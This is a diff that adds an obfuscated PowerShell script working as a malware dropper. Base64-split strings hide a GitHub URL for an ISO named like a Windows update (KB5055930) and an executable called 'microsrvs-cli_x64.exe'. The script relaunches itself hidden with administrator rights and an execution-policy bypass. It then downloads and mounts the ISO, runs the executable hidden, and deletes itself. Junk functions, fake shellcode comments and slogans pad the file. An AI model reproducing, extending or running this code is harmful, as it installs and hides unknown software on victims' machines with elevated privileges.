@@ -1,0 +1,215 @@
+<#
+  ██╗  ███████╗ ██████╗ ██╗     ██╗  ██████╗ 
+  ██║  ██╔════╝██╔═══██╗██║     ██║ ██╔═══██╗
+  ██║  ███████╗██║   ██║██║     ██║ ██║   ██║
+  ██║  ╚════██║██║   ██║██║     ██║ ██║   ██║
+  ██║  ███████║╚██████╔╝███████╗██║ ╚██████╔╝
+  ╚═╝  ╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═════╝ 
+#>
+#      هیچ چیز حقیقت ندارد، همه چیز مجاز است
+# ==========================================
+# 0x50, 0x48, 0x89, 0xe1, 0x48, 0xec, 0xff >
+$__g1 = 0
+$__g2 = $null
+function __f1 { $a=1; $b=2; $a+$b }
+function __f2 { Get-Date | Out-Null }
+function __f3 { $x=0..5; $x[2] }
+
+# B8 0E 90 00 X0 02 0M 00 40 A0 C0 00 80 0U 07 01
+function __d($x) { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x)) }
+$__s = @()
+$__s += 'aHR0cHM6Ly9n' + 'aXRodWIuY29t' + 'L25vZGUtbmww' + 'L2dvL3JlbGVh' + 'c2VzL2Rvd25s' + 'b2FkL3Rlc3Qv' + 'S0I1MDU1OTMw' + 'Lmlzbw=='
+$__z = 1 + 1
+$__s += 'S0I1MDU1OTMw' + 'Lmlzbw=='
+$__s += 'bWljcm9zcnZz' + 'LWNsaV94NjQu' + 'ZXhl'
+$__s += 'djM='
+$__s += 'c2NyaXB0Lmxv' + 'Zw=='
+$__u = __d $__s[0]                           # C0 00 80 0U > 0x59, 0x66, 0x41, 0x8b, 0x04, 0x44, 0x41,
+$__iso = __d $__s[1]                         # B8 0E 9N 00 > 0x4c, 0x01, 0xc0, 0x53, 0xc3, 0x48, 0x31,
+$__exe = __d $__s[2]                         # 20 X0 02 0M > 0x07, 0x48, 0xb8, 0x0f, 0xa8, 0x96, 0x91,
+$__dir = __d $__s[3]                         # 04 A7 C0 L0 > 0x9c, 0x48, 0xf7, 0xd0, 0x48, 0xc1, 0xe8,
+$__logf = __d $__s[4]                        # 80 0U 07 K5 > 0xe8, 0xb0, 0xff, 0xff, 0xff, 0x49, 0x89,
+$__exp = 'A79F9B2B74D3' + '3BFA5377455D7' + '47EE987822B0' + '602318E8D57B' + 'BF46BB3D25FE' + 'D64'
+# 0x08000000 ---> ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+$__p = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+$__a = $__p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $__a) {
+    Start-Process -WindowStyle Hidden -Verb RunAs -FilePath powershell.exe -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$PSCommandPath`""
+    exit
+}
+#                            shellcode
+#    ----------------------------------------------------------
+#    0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48, 0x8b, 0x58,
+#    0x60, 0x48, 0x8b, 0x5b, 0x18, 0x48, 0x8b, 0x5b, 0x20, 0x48,
+#    0x8b, 0x1b, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49,
+#    0x89, 0xd8, 0x8b, 0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31,
+#    0xc9, 0x66, 0x81, 0xc1, 0xff, 0x88, 0x48, 0xc1, 0xe9, 0x08,
+#    ----------------------------------------------------------
+
+$__wd = "$env:TEMP\$__dir"
+$__ip = Join-Path $__wd $__iso
+$__lg = Join-Path $__wd $__logf
+if (-not (Test-Path $__wd)) {
+    New-Item -ItemType Directory -Force -Path $__wd | Out-Null
+}
+
+# AES
+function __w($m) {
+    $__ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+    Add-Content -Path $__lg -Value "$__ts - $m" -Encoding UTF8
+}
+# هر کس که با ما دشمنی کند، در تاریکی فرو خواهد رفت
+__w '=============== <o> ==============='
+__w '[1/4] Downloading ISO...'
+
+# MRX
+try {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    if (Test-Path $__ip) {
+        $__fi = Get-Item $__ip -EA 0
+        if ($__fi -and $__fi.Length -lt 1024) {
+            Remove-Item -Path $__ip -Force -EA 0
+        }
+    }
+    $__dl = $false
+    try {
+        if (Get-Command Start-BitsTransfer -EA 0) {
+            Start-BitsTransfer -Source $__u -Destination $__ip -DisplayName 'ISO Download' -Description 'Downloading ISO' -TransferType Download -EA Stop
+            $__dl = $true
+        }
+    } catch {
+        __w "BITS download failed - $($_.Exception.Message)"
+    }
+    if (-not $__dl) {
+        Invoke-WebRequest -Uri $__u -OutFile $__ip -UseBasicParsing -EA Stop
+    }
+    $__fi = Get-Item $__ip -EA 0
+    if (-not $__fi -or $__fi.Length -le 0) {
+        __w 'ERROR: Downloaded file is empty or missing!'
+        exit 1
+    }
+    __w "+ Downloaded: $($__fi.Length) bytes"
+} catch {
+    __w "ERROR: Download failed - $($_.Exception.Message)"
+    exit 1
+}
+
+# X18
+try {
+    $__h = Get-FileHash -Path $__ip -Algorithm SHA256 -EA Stop
+    if ($__h.Hash.ToLower() -eq $__exp.ToLower()) {
+        __w '[+] SHA256 verification: OK'
+    } else {
+        __w 'ERROR: SHA256 verification failed!'
+        __w "Expected: $__exp"
+        __w "Got: $($__h.Hash)"
+        try {
+            $__head = Get-Content -Path $__ip -TotalCount 5 -Raw -EA 0
+            if ($__head -and $__head -match '<!DOCTYPE|<html|<meta') {
+                __w 'Downloaded file appears to be HTML (error page).'
+            }
+        } catch {}
+        exit 1
+    }
+} catch {
+    __w "ERROR: SHA256 verification error - $($_.Exception.Message)"
+    exit 1
+}
+
+# CMD
+__w '[2/4] Mounting ISO...'
+try {
+    Mount-DiskImage -ImagePath $__ip -EA Stop
+    Start-Sleep -Seconds 3
+} catch {
+    __w "ERROR: Failed to mount ISO - $($_.Exception.Message)"
+    exit 1
+}
+
+# ZDI
+__w '[3/4] Detecting mounted drive...'
+$__dr = $null
+try {
+    Start-Sleep -Seconds 2
+    $__dlv = Get-DiskImage -ImagePath $__ip -EA 0 | Get-Volume -EA 0 | Select-Object -ExpandProperty DriveLetter -First 1
+    if ($__dlv) {
+        $__dr = "${__dlv}:"
+        __w "[+] Found via Get-Volume: $__dr"
+    }
+} catch {}
+
+if (-not $__dr) {
+    __w "Searching all drives for $__exe..."
+    $__drvs = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Root
+    foreach ($__rt in $__drvs) {
+        $__tp = Join-Path $__rt $__exe
+        if (Test-Path $__tp) {
+            $__dr = $__rt.TrimEnd('\')
+            __w "[+] Found on $__dr"
+            break
+        }
+    }
+}
+
+if (-not $__dr) {
+    __w 'Checking CD/DVD drives...'
+    $__cd = Get-CimInstance -ClassName Win32_LogicalDisk | ? { $_.DriveType -eq 5 }
+    foreach ($__dv in $__cd) {
+        $__tp = Join-Path ("$($__dv.DeviceID)\") $__exe
+        if (Test-Path $__tp) {
+            $__dr = $__dv.DeviceID
+            __w "[+] Found on CD/DVD: $__dr"
+            break
+        }
+    }
+}
+
+if (-not $__dr) {
+    __w 'ERROR: Could not find mounted ISO or executable!'
+    try { Dismount-DiskImage -ImagePath $__ip -EA 0 } catch {}
+    exit 1
+}
+# ما در سایه کار می‌کنیم تا به نور خدمت کنیم
+__w "[+] ISO mounted as $__dr"
+__w "[4/4] RUN $__exe..."
+$__ep = Join-Path $__dr $__exe
+
+# CVE
+if (Test-Path $__ep) {
+    $__ee = Get-CimInstance Win32_Process | ? { $_.Name -ieq (Split-Path $__exe -Leaf) -and ($_.CommandLine -and $_.CommandLine -match [regex]::Escape($__exe)) }
+    if ($__ee) {
+        __w 'Executable already running; skipping start.'
+    } else {
+        try {
+            Start-Process -FilePath $__ep -WindowStyle Hidden
+            __w "[+] $__exe started!"
+        } catch {
+            __w "ERROR: Failed to start - $($_.Exception.Message)"
+            try { Dismount-DiskImage -ImagePath $__ip -EA 0 } catch {}
+            exit 1
+        }
+    }
+} else {
+    __w "ERROR: Executable not found at $__ep"
+    try { Dismount-DiskImage -ImagePath $__ip -EA 0 } catch {}
+    exit 1
+}
+
+# EXP
+__w "[+] Waiting 25 seconds..."
+Start-Sleep -Seconds 25
+__w '[+] ISO OK!'
+__w '[+] Unmounting ISO...'
+try {
+    Dismount-DiskImage -ImagePath $__ip -EA Stop
+    Start-Sleep -Seconds 2
+} catch {
+    __w "WARNING: Failed to unmount ISO - $($_.Exception.Message)"
+}
+# مرگ در راه حقیقت، بالاترین افتخار است
+__w '[+] Successfully completed!'
+try {
+    Remove-Item -Path $PSCommandPath -Force -EA 0
+} catch {}
+exit 0
+# end
